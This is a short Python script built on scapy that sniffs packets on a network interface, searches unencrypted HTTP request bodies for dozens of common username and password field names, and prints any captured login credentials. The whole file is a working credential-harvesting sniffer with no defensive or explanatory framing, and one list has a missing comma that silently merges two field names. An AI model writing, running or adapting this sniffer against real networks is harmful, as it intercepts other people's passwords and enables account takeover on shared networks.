from scapy.all import *
from urllib import parse
import re

iface = "eth0"

userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
              'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
              'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
              'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
              'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
              'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
              'login_password'
              'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']


def get_login_pass(body):
    user = None
    passwd = None

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)  # login= Not &, 1 or more
        if login_re:
            user = login_re.group()
            break
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)  # pass= Not &, 1 or more
        if pass_re:
            passwd = pass_re.group()
            break

    if user and passwd:
        return user, passwd


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))  # Username
            print(parse.unquote(user_pass[1]))  # Password


try:
    # Only works on http sites
    sniff(iface=iface, prn=pkt_parser, store=0)  # Passes each packet
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
